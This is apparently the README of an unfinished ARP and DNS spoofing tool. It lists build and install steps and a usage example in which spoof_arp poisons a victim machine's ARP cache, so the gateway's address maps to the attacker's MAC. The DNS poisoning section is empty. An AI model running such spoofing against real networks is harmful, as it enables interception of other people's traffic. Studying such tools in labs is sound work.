Work In Progress

### Dependencies
* libnet-dev


### Install
I recommend using a virtualenv for this.
```bash
git clone https://github.com/adw1n/dns-spoofer
cd dns-spoofer
python setup.py build
python setup.py install  # or add dnsspoofer.so to the PYTHONPATH
```

### Usage

#### ARP poisoning
```python
sudo python  # dnsspoofer requires root privileges
import dnsspoofer
# your mac addr:
# 33:33:33:33:33:33
# example arp -n output:
# gateway:
# 192.168.1.1     ether   10:20:30:40:50:60   C  em1
# victim:
# 192.168.1.100   ether   01:02:03:04:05:06   C  em1
dnsspoofer.spoof_arp(b"\x01\x02\x03\x04\x05\x06",b"192.168.1.1")
# now arp -n output on the victim machine:
# 192.168.1.1     ether   33:33:33:33:33:33   C  em1
```

#### DNS poisoning
TODO
